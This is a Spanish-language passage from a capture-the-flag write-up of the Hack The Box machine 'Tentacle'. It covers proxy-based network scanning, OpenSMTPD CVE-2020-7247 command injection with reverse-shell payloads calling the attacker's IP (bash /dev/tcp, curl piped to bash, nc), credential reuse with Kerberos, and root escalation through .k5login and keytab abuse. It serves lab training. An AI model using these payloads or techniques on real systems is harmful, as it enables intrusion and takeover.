Jmmm, intentemos hacer **fuzzing** a ver si encontramos algo:

```bash
❭ proxychains dirsearch.py -u wpad.realcorp.htb 2>/dev/null
```

```bash
...

[18:31:40] Starting: 
[18:32:59] 200 -  342B  - /wpad.dat

Task Completed
```

Opa, tenemos un archivo llamado `wpad.dat`... Esto me llamo la atención asi que me fui pa la web a indagar un poco sobre el dominio `wpad.<etc>.<etc>`:

> `WPAD` es un protocolo diseñado para hacer una configuracion de proxy facilmente, todo mediante un archivo que es el encargado de hacerlo facil (`wpad.dat`). Su funcionamiento es simple, cuando alguien se conecta a la red, el dispositivo descargara el archivo y automaticamente configurara todo el proceso para que ese alguien pueda interactuar con la red sin problemas.

* [¿Qué es el protocolo **WPAD**?](https://www.redeszone.net/2017/03/15/desactiva-wpad-windows/).

Perfecto ahora que sabemos que hace ese archivo y porque esta ahí, procedamos a descargarlo a ver que contiene:

```bash
❭ proxychains wget http://wpad.realcorp.htb/wpad.dat
```

```bash
❭ cat wpad.dat 
function FindProxyForURL(url, host) {
if (dnsDomainIs(host, "realcorp.htb"))
return "DIRECT";
if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
return "DIRECT"; 
if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
return "DIRECT"; 

return "PROXY proxy.realcorp.htb:3128";
}
```

Bien, vemos como asigna las direcciones IP:

* Un ID `10.197.243.0` (que con este rango de IPs ya jugamos).
* Un nuevo ID `10.241.251.0` del cual podemos probar a ver que IPs están activas (Entre el rango de `.1` a `.254`).

Hagámosle el escaneo para saber que IPs nos reporta como activas:

```bash
❭ proxychains nmap -v --min-rate=2000 10.241.251.0/24 -oN allIP 2>/dev/null
```

El reporte es gigante, podemos extraer info esclarecedora asi:

```bash
❭ cat allIP | grep "host down"
Nmap scan report for 10.241.251.4 [host down]
...
❭ cat allIP | grep "host down" | wc -l
26
```

Hay 26 hosts que al parecer están inactivos. Los que no tienen ese estado los filtra como `Up`:

```bash
❭ cat allIP | grep "up" -A 1 -B 1
Nmap scan report for 10.241.251.6
Host is up (0.00015s latency).
All 1000 scanned ports on 10.241.251.6 are filtered
...
```

Entonces, extraigamos las IPs y guardémoslas en un archivo para hacerle un escaneo de puertos rápido, aprovechemos que en la línea que contiene el `filtered` aparecen:

> `filtered` nos indica que **nmap** no puede saber con certeza esta abierto. [Tipos de estados - nmap](https://nmap.org/man/es/man-port-scanning-basics.html).

```bash
❭ cat allIP | grep "filtered"
All 1000 scanned ports on 10.241.251.0 are filtered
All 1000 scanned ports on 10.241.251.1 are filtered
All 1000 scanned ports on 10.241.251.2 are filtered
...
❭ cat allIP | grep "filtered" | cut -d ' ' -f 6 > IPtoSCAN
❭ cat IPtoSCAN 
10.241.251.0
10.241.251.1
10.241.251.2
10.241.251.3
...
```

Despues de un sondeo y probar cosas, el que mejor se comportó fue este escaneo:

```bash
❭ proxychains nmap -sT --top-ports=100 --open --host-timeout 2m --min-rate=2000 -Pn -v -iL IPtoSCAN -oN proxyNEW_ports 2>/dev/null
```

| Parámetro | Descripción |
| --------- | :---------- |
| --top-ports    | Escanea los X puertos más populares (100 en este caso).                                  |
| --open         | Solo los puertos que estén abiertos.                                                     |
| --host-timeout | Si ha pasado X tiempo y el escaneo no ha acabado, cancela la conexión con esa dirección. |
| --iL           | Toma un archivo donde estén direcciones IP.                                              |

Al final en el archivo `proxyNEW_ports` se guardó muuuuuuuuuuucho, pero todas las IPs fueron descartadas por timeout... Peeero si nos damos cuenta (o filtramos con grep) en el verbose, tenemos un puerto sobre la ip `10.241.251.113`:

![310bash_proxy_nmap_found113](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_proxy_nmap_found113.png)

```bash
...
10.241.251.134 timed out during Connect Scan (7 hosts left)
Discovered open port 25/tcp on 10.241.251.113
...
```

Perfectoooooooooooooo, ahora volvamos a validar hacia ese host:

```bash
❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.241.251.113 -oN proxyNEW-113 2>/dev/null
```

```bash
❭ cat proxyNEW-113 
# Nmap 7.80 scan initiated Thu Mar  4 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyNEW-113 10.241.251.113
Nmap scan report for 10.241.251.113
Host is up (0.50s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
25/tcp open  smtp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Mar  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 489.74 seconds
```

Bien, hagámosle el escaneo de scripts y versiones para ver quien esta manteniendo ese puerto `SMTP`:

```bash
❭ proxychains nmap -p 25 -sC -sV -Pn -v 10.241.251.113 -oN proxyNEW-113_port25 2>/dev/null
```

```bash
❭ cat proxyNEW-113_port25 
# Nmap 7.80 scan initiated Thu Mar  4 25:25:25 2021 as: nmap -p 25 -sC -sV -Pn -v -oN proxyNEW-113_port25 10.241.251.113
Nmap scan report for 10.241.251.113
Host is up (0.47s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
Service Info: Host: smtp.realcorp.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 12.14 seconds
```

Vale entonces tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 25     | [SMTP](https://blog.mailrelay.com/es/2017/04/25/que-es-el-smtp) | OpenSMTPD 2.0.0 |

* Domain: `smtp.realcorp.htb`.

> OpenSMTPD is the mail transfer agent (e-mail server) of the OpenBSD operating system and is also available as a ‘portable’ version for other UNIX systems, such as GNU/Linux. [RangeForce.com - CVE-2020-7247](https://www.rangeforce.com/blog/cyber-security-training-module-cve-2020-7247-priviledged-remote-code-execution-os-command-injection).

Investigando en internet sobre esa versión, encontramos una vulnerabilidad llamativa que nos permite ejecutar comandos en el servidor que contenga el servicio `SMTP` como **root**:

* [CVE-2020-7247 - cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247).

> The vulnerability is caused by improper validation of the e-mail sender address. 
> The sender address is included in the command line when the mailbox delivery program is called; if the sender address includes shell meta-characters these will be interpreted by the shell, allowing the execution of commands on the server. [RangeForce.com - CVE-2020-7247](https://www.rangeforce.com/blog/cyber-security-training-module-cve-2020-7247-priviledged-remote-code-execution-os-command-injection).

Nice, suena lindo lindo.

Pero antes de probar, recordemos que al inicio encontramos un correo del administrador del sistema: `j.nakazawa@realcorp.htb`. Recordé una forma que [ippsec](https://www.youtube.com/c/ippsec/videos) enseño para comprobar si un usuario es válido en el servicio `SMTP`, asi que hagámosla para asegurarnos que ese correo exista:

* [Validando usuarios manualmente en el servidor **SMTP** - ippsec video](https://www.youtube.com/watch?v=ob9SgtFm6_g&t=1150s)

Hacemos una trama normal, solo que en el receptor ponemos el usuario que creemos válido y otro que probablemente no, la respuesta es la clave:

![310proxy_validate_nakazawaUSERsmtp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310proxy_validate_nakazawaUSERsmtp.png)

Perfecto, entonces sabemos que es una dirección de correo válida, ahora si exploremos la explotación...

* [CVE-2020-7247 Privileged Remote Code Execution / Command Injection](https://www.rangeforce.com/blog/cyber-security-training-module-cve-2020-7247-priviledged-remote-code-execution-os-command-injection).
* [OpenSMTPD Privilege Escalation Code Execution](https://packetstormsecurity.com/files/156137/OpenBSD-OpenSMTPD-Privilege-Escalation-Code-Execution.html).
* [OpenSMTPD Remote Vulnerability](https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/).
* [Exploit - github.com/superzerosec/CVE-2020-7247](https://github.com/superzerosec/cve-2020-7247).

**(El exploit de `github.com/superzerosec` es funcional, pero en mis primeros intentos no logre que funcionara (por una tontada que veremos adelante y que se me olvido probar) asi que lo deje a un lado y empece a buscar otras formas)**.

En el primer recurso nos muestra una forma sencilla de explotar la vulnerabilidad, en el que le agregaríamos al remitente el código que queramos ejecutar:

> Ejemplo del articulo:
>> MAIL FROM:<; killall puppies ; echo >

> Nuestro ejemplo:
>> MAIL FROM:<;ping -c 1 10.10.14.138;sh>

Lo que quiero lograr es ver si la máquina nos hace una petición `ICMP`, asi que pongámonos en escucha por la interfaz donde esta nuestra IP (en este caso la de HTB, `tun0`) y filtremos por las capturas **ICMP**:

```bash
❭ tshark -i tun0 -Y "icmp" 2>/dev/null
```

Y ejecutamos:

![310bash_proxy_telnet_poc_withping](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_proxy_telnet_poc_withping.png)

Perfecto, tenemos ejecución remota de comandos, intentemos ejecutarnos una Reverse Shell (JA)...

Intentando cositas como:

> MAIL FROM:<;ping -c 1 10.10.14.138;id | nc 10.10.14.138 4433;>
>> Obtenemos la peticion `ICMP` pero nada en nuestro listener `nc`.
> MAIL FROM:<;ping -c 1 10.10.14.138;bash -i >& /dev/tcp/10.10.14.138/4433 0>&1;>
>> Nos da un error de que no es valido el caracter `&`.
> MAIL FROM:<;ping -c 1 10.10.14.138;curl http://10.10.14.138/revsh.sh | bash;>
>> No obtenemos ninguna peticion en nuestro servidor.

Y bueno otras pruebas, nada... Despues de varios intentos fallidos, volvi a la web y encontre uno de los recursos que referencie antes, en el que nos indican el por que no estamos obteniendo la Shell:

* [OpenSMTPD Privilege Escalation Code Execution](https://packetstormsecurity.com/files/156137/OpenBSD-OpenSMTPD-Privilege-Escalation-Code-Execution.html).

![310page_CVE_we_cant_use_special_chars](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page_CVE_we_cant_use_special_chars.png)

Y más abajo nos indica:

> "we cannot use the `|` and `>` characters" 

Ya que transforma esos caracteres en `:`...

Peeeeeeeeeeero, en el mismo artículo, nos da un PoC de como se haría para aún asi bypassear esto, emulémoslo pero para conseguir una Shell:

![310page_CVE_we_can_bypass_invalid_chars](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page_CVE_we_can_bypass_invalid_chars.png)

Nos ponemos en escucha:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

Y ejecutamos:

![310bash_proxy_smtp_revSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_proxy_smtp_revSH.png)

![310bash_revSHwithSMTP_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_revSHwithSMTP_done.png)

Perfectoooooooooooooooooooooooooooooooooooooooo, estamos dentrooooo. Ufff que locura eh!

**(El tema es que en el servidor no están instalados ni `nc` ni `curl`, por eso no podíamos ejecutarlos antes. El exploit que habíamos encontrado en** github **estaba usando `nc`, no se me paso por la mente cambiarlo para conseguir una Shell con `bash /dev/tcp...`, por eso tampoco funcionada. Pero cambiando esa línea por `bash...` también obtenemos una Shell :P Hubiera sido más directo pero nos sirvió para entender mejor la vulnerabilidad)**

Bueno, ahora a enumerar... (Antes, hacemos tratamiento de la TTY, [s4vitar nos lo explica](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689)).

...

## Explotación [#](#explotacion) {#explotacion}

En el directorio `/home` nos encontramos el usuario `j.nakazawa`, el cual tiene un archivo interesante:

```bash
root@smtp:/home/j.nakazawa$ cat .msmtprc 
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp
```

Según nuestra búsqueda, se trata de un archivo de configuración del servicio [msmtp](https://alquimistadesistemas.com/enviar-correos-desde-el-cliente-msmtp-por-consola.html) (Cliente **SMTP**) el cual contiene una contraseña y un usuario potencial, pero en el servicio **mail**...

Si intentamos rehusar esa contraseña hacia la máquina no obtenemos nada...

Podemos validar la veracidad de esa contraseña en el servicio `SMTP` con la ayuda de esta guía](https://wiki.archlinux.org/index.php/OpenSMTPD#Manual_Submission_port_authentication):

```bash
# Primero la pasamos a base64
root@smtp:/home/j.nakazawa$ printf '\0j.nakazawa\0sJB}RM>6Z~64_' | base64
AGoubmFrYXphd2EAc0pCfVJNPjZafjY0Xw==

# Ahora nos conectamos al servicio que esta corriendo en el puerto 587
root@smtp:/home/j.nakazawa$ openssl s_client -host 127.0.0.1 -port 587 -starttls smtp
CONNECTED(00000003)
...
---
250 HELP
```

Saludamos al servicio `SMTP` y nos autenticamos:

```bash
250 HELP
HELO lanz.corp
250 smtp.realcorp.htb Hello lanz.corp [127.0.0.1], pleased to meet you
AUTH PLAIN # Escribimos esto
334 
AGoubmFrYXphd2EAc0pCfVJNPjZafjY0Xw==     # Colocamos la cadena en base64
235 2.0.0 Authentication succeeded
```

Pero no podemos ver nada con esto...

De nuevo estuve buscando formas pero no entendía que hacer, asi que necesite algo de ayuda. Me indicaron que me enfocara en el servicio `kerberos` (que habíamos encontrado en el escaneo inicial) y que sobre todo estuviera atento a los hosts :P

Bueno bueno bueeeno... 

> `Kerberos`: Protocolo de autenticación. Su finalidad es proveer mayor seguridad, ya que la persona que quiera ingresar al sistema, primero debera hacer una peticion al **KDC** (Centro de distribucion de llaves) pidiendo un ticket (**Ticket-Granting Ticket**), el ticket sera encriptado usando la password como llave y nos devolvera el ticket con un tiempo de expiracion para iniciar sesión.

* [Breve introducción a **Kerberos**](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Introduction.html#Introduction).

Claramente su uso es más profundo, pero en términos generales podemos tener esa idea...

![310cita_varonis_simple_kerberos_diagram](https://www.varonis.com/blog/wp-content/uploads/2018/07/Kerberos-Graphics-1-v2-787x790.jpg)

> Imagen tomada de [varonis.com/kerberos-authentication-explained](https://www.varonis.com/blog/kerberos-authentication-explained/).

Algunos recursos que están buenos pa echarles el ojo:

* [Como funciona **Kerberos** - ES](https://www.tarlogic.com/blog/como-funciona-kerberos/).
* [**Kerberos** authentication](https://www.varonis.com/blog/kerberos-authentication-explained/).

Bueno, ahora que tenemos la idea, veamos que tenemos para jugar con `kerberos`:

* Tenemos a `kerberos` corriendo sobre el puerto `88` del host `10.10.10.224`.
* El dominio del `kerberos` esta sobre `realcorp.htb` (si recordamos en el inicio cuando revisamos el puerto desde la web, ahí aparecía).
* Contamos con unas credenciales que posiblemente se estén reutilizando: `j.nakazawa -> sJB}RM>6Z~64_`.

Buscando maneras de logearnos al servicio, encontramos este recurso:

* [Service **Kerberos** - Ubuntu](https://ubuntu.com/server/docs/service-kerberos).

Nos indica lo que debemos descargar:

```bash
apt install krb5-user sssd-krb5
```

En el proceso nos salta una ventana (supongo que es esta, ya que escribí esto despues de la descarga :P) en la que debemos indicarle el dominio y servidor `kerberos`:

Dominio (reino, esta explicado en la misma imagen e.e)

![310bash_install_krb5_utils_domain](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_install_krb5_utils_domain.png)

Servers (acá escribimos el servidor en el que esta montado `kerberos`)

![310bash_install_krb5_utils_server1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_install_krb5_utils_server1.png)

![310bash_install_krb5_utils_server2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_install_krb5_utils_server2.png)

> Para volver a obtener la configuración (por si la embarramos o cualquier otra cosa) escribimos: `sudo dpkg-reconfigure krb5-config`.
> Asi mismo, el archivo en que se estan guardando estas configuraciones esta en la ruta: `/etc/krb5.conf`.

Listos, ahora debemos fijarnos en nuestro archivo `/etc/hosts` para que el servidor `kerberos` (`10.10.10.224:88`) apunte correctamente al dominio al que queremos obtener una sesión:

> Si recordamos el error que nos salio cuando enumeramos el proxy en la web. Vimos que nos respondia con el dominio del cual provenia esa respuesta, osea el dominio al que necesitamos ir:

```bash
❭ cat /etc/hosts
...
10.10.10.224    srv01.realcorp.htb
...
```

Ahora sí, juguemos con `kerberos`. Para generar el ticket debemos usar `kinit`:

```bash
❭ kinit j.nakazawa@realcorp.htb
kinit: Cannot find KDC for realm "realcorp.htb" while getting initial credentials

❭ kinit j.nakazawa@REALCORP.HTB
Password for j.nakazawa@REALCORP.HTB:
```

Para validar que se nos generó el ticket, podemos listarlos:

```bash
❭ klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: j.nakazawa@REALCORP.HTB

Valid starting     Expires            Service principal
07/03/21 21:00:30  08/03/21 21:00:30  krbtgt/REALCORP.HTB@REALCORP.HTB
```

Perfecto, ahora validemos contra el servicio `SSH`:

![310bash_ssh_srv01_shell_jNakazawa](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_ssh_srv01_shell_jNakazawa.png)

BIEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN, estamos dentro ahora de `srv01.realcorp.htb` y tenemos acceso a la flag `user.txt` :')

Que locura, que vaina tan loca, lindo camino. Y bueno, ahora nos queda la mejor parte :P

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si validamos usuarios y archivos relacionados encontramos esto:

```bash
[j.nakazawa@srv01 ~]$ ls /home/
admin  j.nakazawa
```

```bash
[j.nakazawa@srv01 ~]$ find / -group admin 2>/dev/null
/etc/krb5.keytab
/usr/local/bin/log_backup.sh
/home/admin
```

Vemos un archivo interesante, si nos fijamos en su contenido nos damos cuenta de algo:

```bash
[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

Esta haciendo una sincronización (backup) total del directorio `/var/log/squid/*` hacia el directorio `/home/admin` y despues simplemente los comprime con fecha y hora...

Si intentamos ver el contenido de `/var/log/squid/` no podemos:

```bash
[j.nakazawa@srv01 ~]$ ls -la /var/log/squid/
ls: no se puede abrir el directorio '/var/log/squid/': Permission denied

[j.nakazawa@srv01 ~]$ ls -la /var/log
...
drwx-wx---.  2 admin  squid      41 mar  8 16:03 squid
...
```

Validando en que grupo estamos asignados:

```bash
[j.nakazawa@srv01 ~]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) grupos=1000(j.nakazawa),23(squid),100(users) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Tenemos asignado el grupo `squid`, intentemos escribir cualquier cosa sobre esa ruta:

```bash
[j.nakazawa@srv01 ~]$ echo "holas" > /var/log/squid/holas
[j.nakazawa@srv01 ~]$ ls -la /var/log/squid/holas
-rw-rw-r--. 1 j.nakazawa j.nakazawa 6 mar  8 16:17 /var/log/squid/holas
[j.nakazawa@srv01 ~]$ cat /var/log/squid/holas
holas
```

Bien, podemos escribir, ahora sabemos que ese archivo `"/holas"` será enviado al directorio `/home/admin`... Pero ¿qué podemos mover a su directorio para poder obtener su sesión?... (Pues aún no lo sé :P)

Y sí, estuve un tiempo pensando, pero no se me ocurrió nada, asi que busque ayuda. La cual me indico: "no te olvides de `kerberos`"...

Intentando desencriptar el mensaje, encontré [este hilo](https://serverfault.com/questions/608928/kerberos-k5login-and-sudo) hablando sobre `.k5login`, además encontré esta definición:

> "The `.k5login` file, which resides in a user’s home directory, contains a list of the Kerberos principals. Anyone with valid tickets for a principal in the file is allowed host access with the `UID` of the user in whose home directory the file resides. One common use is to place a `.k5login` file in root’s home directory, thereby granting system administrators remote root access to the host via Kerberos." [web.mit.edu/.k5login](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html).

Perfecto, como nos indica, cualquiera con el archivo `.k5login` en su directorio `/home` permitirá obtener una sesión como él (UID). Simplemente el archivo `.k5login` debe contener un usuario válido en el dominio `kerberos`, tenemos a `j.nakazawa@REALCORP.HTB`, asi que generemos el archivo y movámoslo...

> Suppose the user `alice` had a `.k5login` file in her home directory containing just the following line:
>> bob@FOOBAR.ORG
> This would allow `bob` to use Kerberos network applications, such as `ssh`, to access `alice‘s` account, using `bob‘s` Kerberos tickets.

* [Definición de **.k5login** que sirvió como referencia](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html).

Creemos el archivo:

```bash
[j.nakazawa@srv01 ~]$ echo "j.nakazawa@REALCORP.HTB" > .k5login
[j.nakazawa@srv01 ~]$ cat .k5login 
j.nakazawa@REALCORP.HTB
```

Ahora lo movemos e intentamos conectarnos como `admin` por `SSH`, no sabemos cada cuanto se ejecute el script, asi que vamos validando...

```bash
[j.nakazawa@srv01 ~]$ mv .k5login /var/log/squid/
```

Yyy:

```bash
❭ ssh admin@10.10.10.224
admin@10.10.10.224's password:

❭ ssh admin@10.10.10.224
admin@10.10.10.224's password:

❭ ssh admin@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Mon Mar  8 16:42:02 2021
[admin@srv01 ~]$
```

Perfecto, peeeeeeeeeeeerfecto.

Enumerando al usuario `admin` encontramos un archivo interesante:

```bash
[admin@srv01 ~]$ find / -group admin 2>/dev/null | grep -vE "sys|proc|run"
/etc/krb5.keytab
/usr/local/bin/log_backup.sh
/home/admin
/home/admin/.ssh
```

Validándolo:

![310bash_validating_content_keytab_file](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_validating_content_keytab_file.png)

Jmm, veamos que tipo de archivo es:

```bash
[admin@srv01 ~]$ file /etc/krb5.keytab
/etc/krb5.keytab: Kerberos Keytab file, realm=REALCORP.HTB, principal=host/srv01.realcorp.htb, type=1, date=Tue Dec  8 22:15:30 2020, kvno=2
```

Parece relevante, investigando sobre él, encontramos:

> "La clave de servicio es utilizada por un servicio para autenticarse a sí misma en el `KDC`, y solo es conocida por `Kerberos` y el servicio."
> "Un archivo `keytab` es análogo a la contraseña de un usuario. De la misma manera que es importante que los usuarios protejan sus contraseñas, es importante que los servidores de aplicaciones protejan sus archivos keytab. Siempre debe guardar los archivos keytab en un disco local y permitir su lectura sólo al usuario `root`."
>> [docs.oracle.com/keytab](https://docs.oracle.com/cd/E24842_01/html/E23286/aadmin-10.html).

* [Más info sobre **keytab file**](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-install/The-Keytab-File.html).

Uff pues si tiene relevancia, jugando con Google, encontramos como listar las llaves guardadas en cache del archivo `.keytab`:

* [PayloadAllTheThings/ActiveDirectory/keytab](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#ccache-ticket-reuse-from-keytab).

```bash
[admin@srv01 ~]$ klist -k /etc/krb5.keytab
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
2 host/srv01.realcorp.htb@REALCORP.HTB
2 host/srv01.realcorp.htb@REALCORP.HTB
2 host/srv01.realcorp.htb@REALCORP.HTB
2 host/srv01.realcorp.htb@REALCORP.HTB
2 host/srv01.realcorp.htb@REALCORP.HTB
2 kadmin/changepw@REALCORP.HTB
2 kadmin/changepw@REALCORP.HTB
2 kadmin/changepw@REALCORP.HTB
2 kadmin/changepw@REALCORP.HTB
2 kadmin/changepw@REALCORP.HTB
2 kadmin/admin@REALCORP.HTB
2 kadmin/admin@REALCORP.HTB
2 kadmin/admin@REALCORP.HTB
2 kadmin/admin@REALCORP.HTB
2 kadmin/admin@REALCORP.HTB
```

Vale vale valeee... 

Despues de enumerar los comandos que podemos ejecutar mediante `kerberos`:

```bash
[admin@srv01 ~]$ k
k5srvutil       kadmin.local    kbdrate         kdestroy        kexec           klist           kpasswd         kpropd          ksu             kvm_stat
kadmin          kbdinfo         kbxutil         kdumpctl        kill            kmod            kpatch          kproplog        kswitch         kvno
kadmind         kbd_mode        kdb5_util       kernel-install  kinit           kpartx          kprop           krb5kdc         ktutil
```

Dos me llamaron la atención de primeras, `ksu` y `kadmin`. Buscando en internet sus funcionalidades, el más relevante del cual empezaremos a desplegarnos será `ksu`. Es una versión "kerberized" del programa `su` en linux. Su "misión" es la de autenticar y autorizar. Todo esto permitiéndoselo (resolviendo) al "target principal name" (como el usuario principal).

* [Docs Kerberos - User commands (**ksu**)](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_commands/ksu.html).

Entonces, tenemos la idea de algo llamado "target principal name", si buscamos en la web sobre como modificar o agregar algo asi, tenemos:

* [Docs Cloudera - Get or create a **kerberos principal** for each user account](https://docs.cloudera.com/documentation/enterprise/5-3-x/topics/cm_sg_get_princ_4_users_s16.html).

> In the `kadmin.local` or `kadmin` shell, use the following command to **create a principal** for your account by replacing `EXAMPLE.COM` with the name of your `realm`, and replacing `username` with a `username`:
>> kadmin:  addprinc username@EXAMPLE.COM 

* Tons, debemos agregarle el `dominio` (realm) y el usuario (`root`, para despues usar el comando `ksu` y obtener una sesión como él, ya que será el <<principal>>).

Entonces, si jugamos con `kadmin` como comando nos muestra:

```bash
[admin@srv01 ~]$ kadmin 
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal admin/admin@REALCORP.HTB with password.
kadmin: Client 'admin/admin@REALCORP.HTB' not found in Kerberos database while initializing kadmin interface
```

Vale, nuestro usuario no puede usarlo, pero recordemos el archivo `.keytab`, usémoslo y probemos con sus usuarios:

```bash
[admin@srv01 ~]$ klist -k /etc/krb5.keytab | sort -u
---- --------------------------------------------------------------------------
2 host/srv01.realcorp.htb@REALCORP.HTB
2 kadmin/admin@REALCORP.HTB
2 kadmin/changepw@REALCORP.HTB
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
```

```bash
[admin@srv01 ~]$ kadmin -h
kadmin: invalid option -- 'h'
Usage: kadmin [-r realm] [-p principal] [-q query] [clnt|local args]
      [command args...]
clnt args: [-s admin_server[:port]] [[-c ccache]|[-k [-t keytab]]]|[-n]
local args: [-x db_args]* [-d dbname] [-e "enc:salt ..."] [-m]where,
[-x db_args]* - any number of database specific arguments.
                Look at each database documentation for supported arguments
```

```bash
[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal host/srv01.realcorp.htb@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin:  
```

Bien, tenemos una "Shell" dentro de `kadmin` para configurar lo que necesitemos yy estamos "autenticados" como principal (quizás ya podemos relacionar el <<target principal name>>) `host/srv01.realcorp.htb@REALCORP.HTB`.

Intentemos ahora si agregar el nuevo <<target principal name>> según lo que encontramos (como queremos que nuestro principal sea `root`, asi mismo lo indicaremos):

```bash
kadmin:  addprinc root@REALCORP.HTB
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
add_principal: Operation requires ``add'' privilege while creating "root@REALCORP.HTB".
kadmin:  
```

Pero no nos deja, no tenemos permisos, intentemos con otro <<principal>>, siguiendo la lista del `.keytab` seria `kadmin/admin@REALCORP.HTB`.

Para indicárselo al `kadmin` le agregamos el parámetro `-p`:

```bash
[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin:  addprinc root@REALCORP.HTB
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
kadmin:  
```

Vale, con este <<principal>> logramos la creación del nuevo <<principal>> con su respectiva contraseña (cualquiera).

Ahora probemos con el comando `ksu`, coloquemos la contraseña que le hallamos puesto y veamos que nos muestra:

![310bash_kadmin_shell_as_root](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_kadmin_shell_as_root.png)

PERFECTOOOOO!! Somos `root` en la máquina, todo mediante el archivo `.keytab` el cual nos permitió cambiar el "target principal name" para obtener una Shell como él (: Que locura :o

* [Info sobre **Adding or Modifying pricipals**](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html).
* [Configurando **KDCs** - **kadmin add_pricipal**](https://docs.fedoraproject.org/es-ES/Fedora/13/html/Security_Guide/sect-Security_Guide-Kerberos-Setting_Up_Secondary_KDCs.html).
* [Administrating **Keytab** files](https://docs.oracle.com/cd/E19683-01/806-4078/6jd6cjs1l/index.html).

Ahora, solo nos quedaría ver las flags:

![310flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310flags.png)

...

Que cosa insana parceeeeee. Me pareció súper difícil :o Igual muchísimos conceptos nuevos y que no había trabajado, eso también conllevo al buscar bastante ayuda, pero bueno, no podemos quedarnos estancados, lo mejor es buscar ayuda para al menor tener algo de luz. Me encanto el uso de `proxychains`. Fue mi parte favorita. El jugar con `kerberos` fue bastante interesante, entender su funcionamiento y herramientas, increíble. Lindo aprendizaje...

Y bueno, como siempre, muchísimas gracias por leerse tooooda esta locura y a seguir rompiendo todo. Esta máquina me dejo el cerebro exhausto :P